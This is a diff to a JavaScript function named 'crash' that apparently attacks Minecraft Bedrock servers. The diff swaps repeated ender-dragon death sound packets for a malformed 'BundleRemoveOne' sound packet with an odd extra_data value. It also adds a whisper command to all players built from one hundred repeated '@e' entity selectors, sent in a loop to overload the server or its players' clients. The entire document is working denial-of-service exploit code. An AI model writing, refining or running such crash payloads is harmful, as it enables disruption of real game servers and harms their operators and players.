@@ -72,48 +72,15 @@ const crash = async (options) => {
                     entity_type: "minecraft:ender_dragon",
                     is_global: true,
                 });
-                                levelSoundEvent(client, {
+                levelSoundEvent(client, {
+                    sound_id: "BundleRemoveOne",
+                    entity_type: "",
                     position: pos,
-                    extra_data: -1,
-                    sound_id: "Death",
-                    entity_type: "minecraft:ender_dragon",
                     is_global: true,
+                    extra_data: -1124852450,
+                    is_baby_mob: false,
                 });
-                                levelSoundEvent(client, {
-                    position: pos,
-                    extra_data: -1,
-                    sound_id: "Death",
-                    entity_type: "minecraft:ender_dragon",
-                    is_global: true,
-                });
-                                levelSoundEvent(client, {
-                    position: pos,
-                    extra_data: -1,
-                    sound_id: "Death",
-                    entity_type: "minecraft:ender_dragon",
-                    is_global: true,
-                });
-                                levelSoundEvent(client, {
-                    position: pos,
-                    extra_data: -1,
-                    sound_id: "Death",
-                    entity_type: "minecraft:ender_dragon",
-                    is_global: true,
-                });
-                                levelSoundEvent(client, {
-                    position: pos,
-                    extra_data: -1,
-                    sound_id: "Death",
-                    entity_type: "minecraft:ender_dragon",
-                    is_global: true,
-                });
-                                levelSoundEvent(client, {
-                    position: pos,
-                    extra_data: -1,
-                    sound_id: "Death",
-                    entity_type: "minecraft:ender_dragon",
-                    is_global: true,
-                });
+                runCommand(client, `w @a ${"@e".repeat(10).repeat(10)}`, ``);
                 i++;
                 if (delay) await wait(options.delay);
             }
